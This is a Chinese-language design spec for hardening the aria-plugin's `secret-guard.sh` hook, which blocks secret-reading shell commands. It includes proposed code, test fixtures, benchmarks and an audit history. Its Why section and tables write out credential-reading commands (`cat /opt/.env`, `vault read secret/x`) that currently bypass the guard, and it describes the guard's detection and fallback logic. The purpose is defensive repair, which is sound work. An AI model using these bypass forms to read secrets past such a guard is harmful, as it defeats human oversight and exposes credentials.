# secret-guard: fail-safe 逐段判定 (aria-plugin #128)

> **Level**: Minimal (Level 2 Spec)
> **Status**: 📝 **Draft (R5-fix)** — R1 `6C+19M` → R2 `5C+12M` → R3 `4C+13M` → **owner 裁定拉回性能根治** → v4 → 2026-08-08 前提刷新 → R4 (5 席全 REVISE, `6C+13M+17m`, `max_rounds=4` 耗尽未收敛) → owner 裁定 [2] 先修 Critical → v5 = R4-fix → **R5 (owner 批准的超配额全量重审, 5 席全 REVISE, 去重后 `5C`; 判定 22 条新错**由 R4-fix 自身引入**)** → **owner 2026-08-09 裁定: 换执笔人 + C-1 采候选 A** → 本版 R5-fix。审计轨迹全文见 `.aria/audit-reports/post_spec-R{1,2,3,4,5}-*` + R4/R5 汇总 `post_spec-R{4,5}-*-aggregated.md`
> **执笔者 (流程事实, 复核时须知)**: v1–v5 由作者 (主 loop) 执笔; **本版 R5-fix 由 tech-lead 执笔, 主 loop 只做核验** —— owner 2026-08-09 裁定, 依据是本 cycle 五次「勘正动作里新引入错误」中最近一次 (R4-fix, 104 行, R5 判定引入 22 条未去重新错、其中 3 条 Critical 由勘正本身造成), 结论是**执笔者与复核者同一人时这类错误系统性逃逸**。
> **Created**: 2026-08-04
> **Issue**: [aria-plugin #128](https://forgejo.10cg.pub/10CG/aria-plugin/issues/128) — triage **confirmed / critical / 5-5 复现** ([17512](https://forgejo.10cg.pub/10CG/aria-plugin/issues/128#issuecomment-17512)) + [分隔符更正 17545](https://forgejo.10cg.pub/10CG/aria-plugin/issues/128#issuecomment-17545)

> ### 设计演进 (不写版本计数 —— 计数本身漂过一次)
>
> | 版本 | 设计 | 被什么推翻 |
> |------|------|-----------|
> | v1 | 逐段判定, 切 `;` `&&` `\|\|` `&` 换行 | R1: `&` 与 `&>` 冲突; 换行切碎 heredoc; 三个子问题未预见 |
> | v2 | 缩到只切顶层 `;` `&&` | R2: **切 `;`/`&&` 本身不安全** —— 它们大量嵌在 `{ }` / `for…do…done` / `[[ … && … ]]` / `for ((i=0; i<3; i++))` 里, 实测 **5/5 安全写法被误报**, 且语料零覆盖 ⇒ 回归 SC 恒绿是假绿 |
> | v3 | **fail-safe 降级**: 先检测块结构, 不可安全分段则退回整命令判定 | R3: 判据**不封闭** (`exec >/dev/null; …` 无块标记仍误报); 命令位置清单漏 换行/`&`/`time`; **重排只在 benign 负载有效**, 最坏负载 +583% |
> | v4 | v3 + **`has_filter` 13 处转 bash 内建** (owner 裁定拉回) + 启发式表述 + 判据补漏 | R4: 转内建**不是语义保持变换** (两席独立实证 fail-open); `exec`/`time` 漏「仅命令位置」; 「行首/换行之后」不得裸 `^`; **SC-16 的事实前提被实测证伪** |
> | v5 = R4-fix | v4 + **段级换行守卫** (强制) + 两处判据限定补齐 + SC-16 收窄为 `(?:` 一项 + SC-6/14/15 扩容 + SC-9 拆两腿 | R5: 段级守卫**治 fail-open 却造出更宽的 fail-close** (三席独立实测); SC-14 验收公式与自己的 fixture 互斥; SC-6 的 `case` fixture 结构性恒绿; 一处**虚构的文档自我历史**; 转出 9 复现命令**自证伪**; 三个引用标签是编的 |
> | **v6 = R5-fix (本版)** | v5 − 段级守卫 + **逐行内建 helper** (复刻 grep 逐行语义, owner 采候选 A) + SC-14 验收公式拆两组 + SC-6 的 `case` 改隔离单元断言 + 事实/命令/标签/数字四类勘误 + SC-8 补最坏档 + SC-9b 落 Task | 待 owner 判 |
>
> **v5→v6 的性质**: R5 五席一致认为**设计层已收敛**, 不再有设计争议; v5 被推翻的**全部**是勘正动作自身的执行精度 (实现语义选择 / 验收公式 / 事实核实 / 计数口径)。本版据此只改这四类, **不动** fail-safe 降级 + 先 pattern 后 credit + 13 处转内建这三条设计主干。「勘正动作里新引入错误」本 cycle 至此累计五次 (R2 的 68/52 · R3 的 `case`→1 · R3 抓的 `done` 论据 · R4-M-1 换证 · R4-fix 整体), **换执笔人是对这条复发规律的直接处置, 不是对 v5 内容的整体否定** —— v5 把 R4 五席诊断全部读进去了, 无一条被无视。
>
> **R4 的性质与前三轮不同**: 前三轮推翻的是**旧设计**, R4 的 4 条实质 Critical **全部指向 v4 新拉回的那部分范围** (`has_filter` 转内建) 与判据表新增行。owner 2026-08-04 拉回性能根治的裁决方向经三席独立实测**确认正确** (SC-8 四档全部净减少), 代价是把风险从性能面转移到语义保持面 —— 有明确收益的转移, 不是失误。
>
> **本 cycle 被审计方实测推翻的作者断言 (7 条)**: (1) `&` 可作切分记号; (2)「保守不切 = 不会少拦」方向反; (3)「切错 = 安全回归」; (4)「pattern 匹配已全是 bash 内建」(`has_filter` 尚有 13 处 subprocess); (5)「60ms 固定成本是 bash 启动」(实为 `jq` 58ms); (6) R1→R2 重写时把已核实的 141 改成 139; (7)「只切 `;` `&&` = 最小可靠子集」—— 最小但**不可靠**。**无一由作者自查发现**。另有一次自查拦截: v2 验证脚本的正则被 `sed` 破坏后仍"全绿", 作者发现并干净重写后才采信 (见 §What.5 的验证脚本要求)。

## Why

`hooks/secret-guard.sh` 的 pattern 匹配与 `has_filter` credit 均对**整条 `$command`** 求值, 由单一全局开关 (`:663`) 控制全部 **141** 条 pattern。命令任一处出现 credit 串 ⇒ 全部段落免疫全部 pattern (triage 5/5 实测):

```
cat /opt/.env; echo hi >/dev/null                      → exit=0
nomad var put p1 @f1 >/dev/null; nomad var put p2 @f2  → exit=0   ← Aria#170 泄漏形态本身
vault read secret/x; nomad var put p @f >/dev/null     → exit=0   ← 跨 pattern 家族
```

单条 `cat /opt/.env` → `exit=2`。`critical` 判据见 triage comment。

## What

### 1. fail-safe 降级 — 本版的核心机制 (**启发式, 非完备判据**)

**分段前先判断该命令是否"看起来可以安全分段"**; 判否则退回整命令判定 (= 现状行为, 零改善零恶化)。

> ⚠️ **承诺强度已下调 (R3-C-2 证伪)**: 前一版写「降级 = 只在能保证正确时才改变行为」。**该判据类别不封闭** —— 实测 `exec >/dev/null; nomad var get x` **无任何块标记**却同样不可安全分段 (`exec` 的重定向作用于整个 shell 后续, 0→2 误报)。故本机制只能表述为**启发式**: 覆盖已知的块结构类, 但**不保证穷尽**。未知形态的误报归转出 8。

不可安全分段的判据 (引号外命中任一即降级):

| 类别 | 标记 |
|------|------|
| 块字符 | `{` `}` `(` `)` 反引号 `[[` `]]` `<<` `<<<` |
| 块起始关键字 (**命令位置 且 词边界**) | `for` `while` `until` `if` `case` `select` |
| **作用域型内建 (R3-C-1)** | `exec` `time` — **命令位置 且 词边界** |
| **后台记号 (R3-C-1)** | `&` (单独出现, 非 `&&` / `&>` / `>&` / `\|&`) |

> **两条 token 类判据一律「命令位置 **且** 词边界」, 不得只写其一 (R4 tech-lead R4-C-2 → R5 tech-lead R5-C-3 二次收窄)**
>
> R4 只补了「仅命令位置」。**位置限定挡不住命令位置上的子串**: `timeout` 的 `time` 子串就落在行首 = 命令位置。R5-fix 执笔者机械复验两个读法 (`entangle.sh`, 只差 `\b`):
>
> ```
> SC-14 fixture                                  仅命令位置   位置+词边界
> echo runtime; cat /opt/.env; true >/dev/null      true         true
> timeout 5 curl x; cat /opt/.env; true >/dev/null  FALSE        true      <<< 分歧
> execute-plan; cat /opt/.env; true >/dev/null      FALSE        true      <<< 分歧
> exec >/dev/null; nomad var get x                  false        false     (两读法都正确降级)
> time env; cat /opt/.env                           false        false     (同上)
> ```
>
> 后果有二, 都是硬的: (1) **SC-14 新增 fixture #2 在「仅命令位置」的字面文本下不可满足** —— 它要求 `safe_to_split=true`, 字面实现给 false; (2) 305 条语料里 **6 条**的 `exec`/`time` 子串落在命令位置, 其中**只有 2 条真是 `exec`/`time` 命令** (`exec 3< …` / `time env`), 另 **4 条是 `timeout …`** (`timeout 5 env` / `timeout 5 ./run-env-check` ×2 / `timeout 30 make env`) —— 按「仅命令位置」全部无谓降级, R4-C-2 点名的危害原封不动。
>
> 语义上也只有命令位置且成词的 `exec` / `time` 才建立 shell 级作用域, `docker exec` / `find -exec` / `timeout` 里的那些不是。**关键字行同改**: 两行本来就必须同精度 —— R4-C-2 定 Critical 的理由正是「两行两种精度直接产出两种实现」, 只给其中一行加词边界会原样重开该缺陷。SC-14 锁该方向 (本版按 R5 qa-engineer C-1 拆了验收公式)。

**命令位置**定义 (R3-C-1 指出前一版清单有漏且「行首」二义): 行首 / **换行之后** / `;` / `&&` / `\|\|` / `\|` / `&` / `do` / `then` / `else` / `elif` / `in` 之后。

> **⚠️ 「行首」/「换行之后」在 bash `[[ =~ ]]` 下不得写作裸 `^` (R4 backend-architect **CRITICAL-2**, 实现约束)**: bash 走 glibc regex 且无 `REG_NEWLINE`, `^` **只锚定整串开头, 不锚定每行行首** —— 与 grep 的逐行语义相反。backend-architect R4 独立实测: `[[ $'a\nb' =~ ^b ]]` 不匹配; 按「行首→`^`」的直觉翻译, `$'sleep 1\nfor f in a; do cat /opt/.env; done >/dev/null'` 的 `safe_to_split()` 返回 TRUE (应为 FALSE), 循环体被错切成独立段 ⇒ **重开 v2 那次 5/5 误报的同一失效模式**。**必须显式写作含真实换行字符的交替**。逐项核过 12 类位置: 只有「行首」「换行之后」2 类依赖 `^` 语义需专门处理; 其余 10 类靠字面 token / 字符类匹配 (`[[:space:]]` 天然含换行), 不受影响。
>
> **规范写法 (R5-fix 补, R5 code-reviewer m-4 —— 散文说「字面换行」不足以让人写对)**: 正则主体用**单引号**(无转义层), 只把换行拼进去:
>
> ```bash
> nl=$'\n'
> BLOCK_KW_RE='(^|'"$nl"'|;|&&|\|\||\||&|do|then|else|elif|in)[[:space:]]*(for|while|until|if|case|select)\b'
> ```
>
> **⛔ 不得写 `(^|\n)`** —— bash ERE 里 `\n` 是**字母 n**, 不是换行符。它**既漏又多** (实测 `a1_newline.sh` / `a1_pick.sh`):
>
> | 方向 | 探针 | `(^|<真换行>)` | `(^|\n)` |
> |------|------|----------------|----------|
> | **漏** | `$'cd /tmp\nfor f in a b; do …; done >/dev/null'` | 命中 (正确降级) | **不命中** —— 与裸 `^` 同样的失效 |
> | **多** | `run for` / `xnfor` / `n for` / `green if x` | 不命中 (正确) | **全部命中** —— 「以 n 结尾的词 + 关键字」被误判 |
>
> 两个方向各有一条 SC 锁 (实测各只红 1 条, 隔离性好): 漏 → **SC-6 的换行 fixture**; 多 → **SC-14 的 A-4**。上面这条规范写法与「先存 `nl` 再用双引号拼」的写法实测**产出字节相同的正则串**, 选单引号版只因它少一层转义。
>
> **换行必须计入命令位置的支撑证据 (R4-M-1 换证)**: 前一版举 `sleep 1 & for f in a; do cat /opt/.env; done >/dev/null` 说「由 0 翻 2」—— 该例**一个换行都没有** (python `repr` 取字节确认), 且它是 R3-C-1 用来论证「`&` 之后也是命令位置」的例子被搬来支撑换行结论; 更关键的是 v4 采纳后台记号行后该命令**必然走 fallback**, 换行计不计入都恒为现状 (canonical 直调复验 exit=0)。**规则对, 证据错**。改用两席实测可分辨的真换行反例: `$'cd /tmp\nfor f in a b; do cat /opt/.env; done >/dev/null'` —— 含换行读法 fallback (0), 不含换行读法切分后 2。这是本 cycle 第四次「勘正动作里新引入错误」(R2 的 68/52 → R3 的 `case`→1 → R3 抓的 `done` 论据 → 本条)。

> **只检测起始关键字**: 有 `do`/`done` 必有 `for`/`while`, 有 `then`/`fi` 必有 `if`。**必须限定命令位置** —— 否则 `ls; echo for >/dev/null` 里作为普通参数的 `for` 会被误判 (SC-14 锁该方向; 前一版这里举 `echo done` 为例是**错的** —— `done` 根本不在关键字集内, 论证不成立, R3 code-reviewer 勘正)。

### 2. 分段规则 (仅在可安全分段时生效)

| 记号 | 处置 |
|------|------|
| 顶层 `;` `&&` `\|\|` | **切** |
| `\|` (管道) | **不切** — filter 语义载体; **12 条 pattern 把 `\|` 编码进正则本身**, 按 `\|` 切会让 4 条真泄漏用例由 2 翻 0 (R1 tech-lead M-4 实测) |
| 换行 | **不切** — 会切碎 heredoc body |
| `&` `&>` `>&` `\|&` `2>&1` | **不切** — `&` 与重定向记号冲突 (R1 C-1: 打红 2 条合法 credit 写法) |
| 引号内 / `\;` 转义 | **不切** — quote/转义感知 |

**`||` 纳入切分** (v2 曾排除, R2 M-3 勘正): 排除它会留下**一字符绕过** —— `put p1 >/dev/null || put p2` 修后仍 exit=0 而 `;` 形态 exit=2; 且「`||` 需前瞻」的理由不成立 (与 `&&` 同一次单字符前瞻)。

### 3. 判定语义 — **先 pattern 后 credit** (R2 C-1 唯一范围内解法)

```
if not safe_to_split(command):            # §1
    return legacy_whole_command_verdict(command)
for seg in split_top(command):                    # §2
    for pat in patterns:
        if seg =~ pat:                            # bash 内建 =~, 零 fork
            if not compute_credit(seg):           # 13 处判据, 走 §4 的逐行 helper, 同样零 fork
                BLOCK(pat, seg)                   # pat/seg = 当前这一轮的绑定
ALLOW
```

> 伪代码两处勘正 (R4/R5 三席各自点过): (a) `compute_credit` 在 Task 1.3b 之后**零 fork** —— 前一版注释写「13 处 subprocess」, 与 §What.4「使逐段 credit 计算零 fork」直接矛盾; (b) `BLOCK(pat, seg)` 的 `pat` 前一版**未绑定** (写成 `any(...)` 推导式后 `pat` 已出作用域), 改成显式内层循环后 BLOCKED 消息取的就是**当前命中的那条 pattern**。`# guard:ack` 的命令级语义 (SC-12) 在**进入本伪代码之前**判定, 不在段级循环内 —— canonical `:302`/`:311` 两处 ack 检测位于 filter detection 之前。

**顺序重排是布尔等价的** —— R3 tech-lead 独立验证 (`has_filter` 纯函数分析 + 306 条实证 0 不一致): 两者都是「命中 pattern ∧ 无 credit ⇒ 拦」, 未命中时 credit 值不影响结果。

**但重排本身不足以解决性能** (R3 backend C-1 + tech-lead C-3 双方实测推翻作者原判):

> ⚠️ **下表四行原本混用了三个不同基线且一处都没标注 (R4 code-reviewer M-2)** —— 而这张表是 owner 拉回 §What.4 的直接依据。已补「基线」列。「省 80%」与「+102%」**不可比**: 前者是两种逐段实现互比, 后者是逐段 vs 现状整命令。SC-8 的闸门口径是**相对现状整命令**, 与前两行不同源。

| 负载 | 每段先算 credit | 先 pattern 后 credit | 结论 | **基线 (R4 补)** |
|------|----------------|---------------------|------|------------------|
| 2 段全 benign | 146ms | **28ms** | 省 80% | pattern-first vs credit-first (表内两列相除) |
| 3 段全 benign | 158ms | **22ms** | 省 86% | 同上 |
| **2 段全命中** | — | — | **+102%** | pattern-first vs **现状整命令判定** |
| **3 段全命中 (即本 spec 推荐的迁移写法)** | — | — | **+583%** | pattern-first vs **现状整命令判定** |
| ↑ 同档「此档重排还更慢」 | 177.8 | 267.7 | **重排反而更慢** | pattern-first vs credit-first (**第三个基线**) |

作者原判「重排已化解性能矛盾」**只在 benign 负载成立**, 取样漏掉最坏情况; 而最坏负载恰是 spec 自己在迁移建议里推荐的「逐段补 redirect」。

### 4. `has_filter` 13 处转 bash 内建 (**owner 2026-08-04 裁定拉回范围, 原转出 6**)

`has_filter` 区尚有 **13 处 `echo "$command" | grep -qE …`** 未被 v1.26.0 O3 覆盖 —— 逐段化后 fork 次数 = 13 × 段数, 这才是性能矛盾的**根因**。逐条改为 bash 内建 `[[ =~ ]]` (与 `:658` 匹配循环同款, O3 已验证该改造在本 hook 可行), 使逐段 credit 计算**零 fork**。

owner 裁决理由: 绕开 (重排) 只在部分负载有效, 且与 spec 自己的迁移建议冲突; 根治后性能问题不再依赖负载分布。

**代价 (诚实记录)**: 本 spec 范围由「分段」扩为「分段 + credit 判据重构」。采候选 A 后 **13 处正则文本本身不动**, 变的是求值方式 (`grep` 逐行 → helper 逐行), 故须逐条验证**判定不变**而非「正则改写正确」—— SC-15。

> #### ⛔ 转内建**不是**语义保持变换 —— 必须逐行复刻 grep 语义 (R4 tech-lead R4-C-1 + R4 backend-architect CRITICAL-1 → **R5 三席推翻 R4 的修法** → owner 2026-08-09 采候选 A)
>
> **缺陷本体 (R4 两席独立发现, 成立)**: `echo "$command" | grep -qE` 是**逐行**求值 (grep 按 `\n` 拆记录, 任一行匹配即真); bash `[[ =~ ]]` 是**整串**求值 (无 `REG_NEWLINE`, `.` 与 `[[:space:]]` 都跨行)。POSIX `[[:space:]]` 字符类**含换行符**, 而 13 处判据**全部含 `[[:space:]]`** (10 处用 `+`, 12 处用 `*` —— 逐条分布与计数口径见 §6, 已固化进 `corpus_census.py`)。⇒ 逐字直译会在多行 `$command` 上**双向**失真: `cat /opt/.env | awk 'BEGIN{}⏎{print $1}'` 由 **2 → 0** (漏拦, 安全回归); `… | jq keys⏎echo done` 由 **0 → 2** (误报, 即 R2-C-2 被定 Critical 的那一类)。
>
> **⛔ R4 写死的「段级换行守卫」已撤回 —— 它治了一半、造出更宽的另一半**。R5 三席各自实测同一结论 (R5 tech-lead R5-C-1 / R5 backend-architect CRITICAL-1 / R5 code-reviewer C-1), 且**提案人 backend-architect 是推翻自己 R4 方案的那一席**。R5-fix 执笔者独立重跑 (`probes.sh` / `e2e.sh`, 从 canonical 机械抽 13 判据建真 hook 拷贝):
>
> | 形态 | canonical | 段级守卫 | 逐行内建 |
> |------|-----------|----------|----------|
> | `… \| jq keys⏎echo done` (R2-C-2 那一类误报) | 0 | **2** ← 守卫没治 | **0** ✓ |
> | `cd /tmp⏎… \| jq keys⏎echo finished` | 0 | **2** ← 守卫没治 | **0** ✓ |
> | `cat /opt/.env \| awk 'BEGIN{}⏎{print $1}'` (漏拦) | 2 | 2 ✓ | 2 ✓ |
> | `echo start⏎cat /opt/.env \| sha256sum` (无关前导行) | 0 | **2** ← **守卫新造** | **0** ✓ |
> | `cat /opt/.env \\⏎  >/dev/null` (= 本 spec 自己推荐的迁移写法) | 0 | **2** ← **守卫新造** | **0** ✓ |
>
> 守卫是**段级、与判据无关**的粗粒度短路: 段内一有换行, 13 处判据**全部**被清零。故它引入的 fail-close 覆盖 **13/13 处判据**, 比它要修的 fail-open 面更宽; 而「无关换行 + 单行完整 filter」是写 bash 的自然形态。它还打穿了 §What.1 的地基 —— 「fallback = 现状行为, **零改善零恶化**」在多行命令上不成立 (构造 5 条必走 fallback 的多行命令, 5/5 由 0 翻 2)。
>
> **✅ 强制修法 (Task 1.3b 写死, owner 采候选 A)**: grep 的语义是**逐行**, 那就在内建里**照做逐行** —— 不是用毯子近似它。13 处共用一个 helper, 零 fork:
>
> ```bash
> # 复刻 `echo "$x" | grep -qE "$re"` 的记录语义: 按 \n 拆行, 任一行命中即真。
> # $1 = 正则 (不加引号代入 =~, 否则退化为字面匹配); $2 = 待判字符串 (段)
> _sg_line_match() {
>   local _re="$1" _s="$2" _l
>   while IFS= read -r _l || [[ -n "$_l" ]]; do
>     [[ "$_l" =~ $_re ]] && return 0
>   done <<< "$_s"
>   return 1
> }
> ```
>
> 13 处判据逐条由 `if echo "$command" | grep -qE <re>; then` 改写为 `if _sg_line_match <re> "$seg"; then`, **正则文本一个字节不动**。
>
> **本写法是规范性的, 不得"等价改写"** —— 本 spec 已被「同一句散文两种读法产出两种实现」咬过三次 (v4 的 `exec`/`time` 行、裸 `^`、`(^|\n)`)。任何偏离必须过下方的行为闸。
>
> **实测 (R5-fix 执笔者独立复跑, 未采信任何上轮数字)**:
>
> | 口径 | 结果 |
> |------|------|
> | 13 正则 × 11 条对抗字符串 (含空串 / 裸换行 / 首尾换行) vs **grep 真值** | **0 / 143 分歧** |
> | 23 条 credit 级探针 (三组多行形态) vs canonical | **0 分歧** (段级守卫 20 / 字面直译 5) |
> | 11 条端到端 hook 探针 vs canonical | **0 分歧** (段级守卫 8 / 字面直译 3) |
> | 305 条全语料 vs canonical | **0 分歧** |
> | 真 366 条测试套件 (逐行内建版 hook) | 365/366, 唯一 fail 是暂存目录缺 `hooks.json` 的路径检查, **非行为** |
> | 性能 (进程内计时, N=300, 单段) | fork `46102` µs → 逐行内建 `2396` µs (**−94.8%**); 字面直译 `766` µs |
>
> 逐行内建比字面直译贵 (多一层纯 bash 循环, 无 fork/无 I/O: `read` / `[[ ]]` / here-string 全是内建), 但相对**现状 fork 版**仍是一个数量级的净减少 ⇒ **SC-8 的性能结论完整保住**。
>
> **为什么不采另外两个候选**: 方案 2 (逐条收窄 `[[:space:]]` 为 `[ \t]`、`.` 为 `[^\n]`) 需对每处字符类逐条判断"这里是否本就想要跨行容忍", 是**逐条定制审查**而非一次性机械套用, 出错面显著更大 (v5 曾写「工程量大 13 倍」, 该倍数**未经核实**, 本版删去, 只保留定性判断)。方案 B (`${BASH_REMATCH[0]}` 检查实际命中子串, R5 backend-architect 提) 同样零 fork 且明显优于段级守卫, 但它是"近似 grep"的第二种近似, 在「纯尾随换行」形态上仍与 canonical 分歧; 候选 A 是**唯一实测 0 分歧**的解, 且由 tech-lead 与 code-reviewer 两席独立殊途同归。owner 2026-08-09 据此裁定采 A。
>
> **这不属于转出 8 的范围** —— 转出 8 讲的是 `safe_to_split` 判据不封闭 (该 fallback 却没 fallback); 这里是 fallback 判定之后, credit 计算本身在同一物理段内跨行失真。
>
> **为什么现有验收抓不到 (两轮同一句判语)**: SC-11 全语料对**字面直译**恒绿 (0/305), 对**段级守卫**同样恒绿 (0/305, 语料仅 6 条含换行且无一条依赖 credit); SC-15 原文「每处 命中/不命中 各 1 条」一个字都没要求多行形态。这正是 memory `feedback_noop_in_test_env_hardening_needs_mechanism_assertion` + `feedback_counterfactual_test_for_every_new_sc` 的形态: 新机制配了新锁, 锁在它该抓的那一类上零鉴别力 —— 第二次复发时坏的是**修复动作本身**。SC-15 已按此重写为**正负双向**。

### 5. 其余语义

- 任一段 blocked ⇒ 整体 `exit 2` (fail-safe, 与现状一致)。
- BLOCKED 消息须指出**触发段落**, 否则复合命令下无法定位。
- `# guard:ack` 维持**命令级**语义 (SC-12 锁定 —— R2 M-5 指出该裁定此前无 SC 无 task)。
- **跨段 pattern fail-open**: 逐段化后依赖跨 `;` 上下文的 pattern 会失配 (实证 `set -o posix; set | grep foo` 2→0)。本版不兜底, SC-7 锁现状。

### Key Deliverables

- `aria/hooks/secret-guard.sh` — `safe_to_split()` + `split_top()` + **`_sg_line_match()` 逐行 helper** + 判定循环重排 + BLOCKED 消息补段落
- `aria/hooks/tests/secret-guard.test.sh` — 分段器单元测试 + fail-safe 降级族 + credit 多行正负双向族 + 端到端族 + `KNOWN-LIMIT` 转正
- **`aria/hooks/tests/corpus_census.py`** (新增, 随 spec 归档) — 语料统计**与 13 处 credit 判据统计**的**权威计数器**, 见 §6

### 6. 数字口径必须可复算 (根治反复出现的计数争议)

本 cycle 同一统计出过**五个**结果 (作者 68/52/16 · R1 tech-lead 72/53/19 · R1 qa 53/17/2 · R2 qa 65/49/16 · 作者权威计数器 65/49/16), 根因是**数法未固化**而非谁算错。

**定案 65/49/16/15/1 + 5** (作者权威计数器与 R2 qa 双独立扫描器交叉确认, R2 tech-lead / code-reviewer 亦复现一致)。计数器随 spec 交付 (`corpus_census.py`), 口径与 §2 规则表同源: quote-aware, 顶层 `;` `&&` `||` `|`, 换行单列。

> **⚠️ 第六次计数争议已经发生, 对象是 13 处 credit 判据 —— 故该口径一并写进计数器 (R5 code-reviewer m-1 + R5 aggregated 补记)**
>
> 「13 处判据里多少处受换行影响」在四个来源里出了**三个数**: v5 写 11 · R5 tech-lead 数出 12 · R5-fix 执笔者数出 13。逐条排查后**没有人算错** —— 差异全部来自**基线怎么写** (`criterion.sh` 机械对拍):
>
> | 基线写法 | 受影响判据 | 注入点 |
> |----------|-----------|--------|
> | **严格**: `[[:space:]]*` 位置**不写**那个可选空格 (`cat x >/dev/null`) | **11 / 13** | 23 |
> | **宽松**: 同一命令**写出**可选空格 (`cat x > /dev/null`) | **13 / 13** | 25 |
>
> 两种写法都是合法 bash, 差别只在可选空格在不在。**这就是「数法未固化」在第二个统计对象上的原样复发**, 所以处置也一样: 固化进计数器, 不靠人复述。
>
> **`corpus_census.py` 须额外输出 (随 spec 交付, SC-18 机械比对)**:
>
> 1. 13 处判据的**行号清单**, 断言恰 **13** 条 —— 现值 `342 347 358 361 364 368 372 375 383 386 390 394 397`。抽取规则以下面这条**已实跑**的命令为准 (区间取 `# ── Filter detection` 与 `# ── Risky read patterns` 两条 banner 之间, 实测 `318..401`):
>
>    ```bash
>    SRC=aria/hooks/secret-guard.sh
>    s=$(grep -n 'Filter detection'   "$SRC" | head -1 | cut -d: -f1)
>    e=$(grep -n 'Risky read patterns' "$SRC" | head -1 | cut -d: -f1)
>    awk -v s="$s" -v e="$e" 'NR>s && NR<e && /^if echo "\$command" \| grep -qE/ {print NR}' "$SRC"
>    ```
>
> 2. 字面口径三个数: 用 `[[:space:]]+` 的 **10** 处 / 用 `[[:space:]]*` 的 **12** 处 / 含 `[[:space:]]` (任意量词) 的 **13** 处;
> 3. **换行影响面须同时报两个基线口径的数** (`严格 11/13` 与 `宽松 13/13`), 并在输出里注明基线字符串本身 —— 只报一个数就是把这次争议留给下一轮。
>
> 上述数字全部由 R5-fix 执笔者从 canonical 机械抽取后复算, **未采信任何审计报告里的转述**。**本版之后, 凡 spec 正文引用「13 处判据的任一统计」, 必须是计数器的输出, 不得手数。**
>
> 附带后果: 采逐行内建 helper 后, 13 处判据**一律**走同一 helper, "受影响的是哪几处"不再是任何 Task 或 SC 的输入 —— 这个数从**载荷**降为**说明**。这是本条修法的第二重价值: 不只把口径固化, 还把它从关键路径上拿掉。

> **⚠️ 原型正则不可逐字搬运 (R3 backend M-2 → **R4 code-reviewer C-1 事实勘正**)**: 作者原型用 Python 正则。前一版写「含 `(?:…)` / `\b` / `\s` —— bash 的 POSIX ERE **全不支持**」—— **三者中两个是错的**。
>
> R4 三方独立实测 (code-reviewer / backend-architect / 主 loop, bash 5.2.15 + glibc) 一致:
>
> | 语法 | bash `[[ =~ ]]` | 证据 |
> |------|----------------|------|
> | `(?:…)` 非捕获组 | ❌ **rc=2 编译失败** | `[[ ab =~ (?:a)b ]]` → rc=2 |
> | `\b` 词边界 | ✅ **支持** (GNU 扩展) | `\bbar\b` 命中 `foo bar`、不命中 `foobar` (证明真生效非当字面 `b`) |
> | `\s` / `\w` | ✅ **支持** (GNU 扩展) | `a\sb` 命中 `a b`; `\w+` 命中 `abc` |
>
> **被审代码自己就是活反例**: `secret-guard.sh` 的匹配循环用的正是 `[[ "$command" =~ $pat ]]`, 而 141 条 pattern 里 **16 条含 `\b`** (`\bpg_dump\b` / `vault[[:space:]]+agent\b` 等), 测试 **366/366 全绿**。若不支持, 这些早该静默失配。
>
> 错误来源: R3 backend M-2 把三个语法捆在**同一条正则**里测 (`'(?:for|while)\s'` 一次 rc=2), 把 `(?:` 的编译失败**归因给了全部三个**; v4 忠实继承该归因错误 —— memory `feedback_spec_inherits_upstream_dec_errors` (忠实 ≠ 正确) 与 `feedback_never_write_unverified_impossibility_claims` 的合流形态。
>
> **修正后的实现约束**: (1) `(?:…)` 必须去掉 (真编译失败); (2) `\b` / `\s` / `\w` **允许保留** —— 它们是 glibc GNU 扩展、本 hook 已在生产使用, 但须在 SC-16 记为「已知 GNU 依赖」, 非 glibc 平台 (macOS / BSD / musl) 的行为差异**归转出 9**; (3) **不得**把 `\b` 机械改写成 `([^a-zA-Z]|$)` 之类 —— 语义真的会变 (`\b` 视 `_` 与数字为词内字符, 字符类不视), 而 13 处 credit 里恰有 2 处含 `\b` (`grep[[:space:]]+(-v|--invert-match)\b` / `(sha256sum|md5sum|sha1sum|sha512sum)\b`)。
>
> **为什么这条定 Critical**: SC-15 (语义不变) 与 SC-16 (不含 `\b`) 在**必然发生的输入**上互斥 —— 逐字保留则 SC-16 不过, 改写则 SC-15 不过或在其 26 条视野外静默改变拦截面。Rule #10 下 Phase B 两条闸门都不能自行豁免, 而 spec 原本没给裁定。本次改法即为该裁定。
>
> **另**: SC-16 是**语法层**检查 (能否编译), 结构上抓不到「编译通过但语义窄」的错误 —— R4 backend-architect CRITICAL-2 的裸 `^` 正是此类。两者互补, 不可相互替代。
>
> **另**: 验证脚本若经 `sed` 等就地编辑, **必须重读确认正则未被破坏后才可采信结果** —— 本 cycle v2 原型被 `sed` 写坏正则后仍输出"全绿", 作者干净重写才发现。
>
> **跨版本搬运纪律 (R4-M-1)**: 从上一轮报告搬运的实测数字, **必须在新规则下重跑**后才可写入 —— v4 的 `&` 已成降级标记, R3 在 v3 规则下测的「由 0 翻 2」在 v4 下不复成立。

## 关键决策

| 决策 | 选择 | 理由 |
|------|------|------|
| **块结构** | **fail-safe 降级到整命令判定** (**启发式, 不保证穷尽**) | v2 的「切了再说」实测 5/5 误报; 但判据类别**不封闭** (R3-C-2: `exec` 类无标记仍需降级) ⇒ 承诺强度下调, 残余误报归转出 8 |
| 切分记号 | 顶层 `;` `&&` `\|\|` | `&`/换行各有实测反例; `\|\|` 排除会留一字符绕过 |
| 管道 | 不切 | 12 条 pattern 把 `\|` 编码进正则 |
| 判定顺序 | **先 pattern 后 credit** | **布尔等价, 且该等价与 credit 的实现方式无关** —— 只依赖「credit 是该段的纯函数」这一条: `(∃pat: seg =~ pat) ∧ ¬credit(seg)` 与 `¬credit(seg) ∧ (∃pat: seg =~ pat)` 恒等。逐行 helper 是对同一只读字符串的无副作用判定, 纯函数性质不变 ⇒ 等价成立。**前一版挂的「R3 tech-lead 306 条 0 不一致」实证是对 grep 版 credit 做的, credit 实现本版已换, 论证链前提已变** (结论仍对), 故改为实现无关的代数论证 —— 这样 credit 再改一次也不失效 |
| quote-aware | 必须 | 理由是**语义正确性** (切出不完整片段), 非「防安全回归」(R1 已证伪) |
| `has_filter` 13 处 subprocess | **重构为 bash 内建** (owner 2026-08-04 裁定) | 重排只在 benign 负载有效, 最坏负载 (= spec 自己推荐的迁移写法) +583%; 根治后性能不再依赖负载分布 |
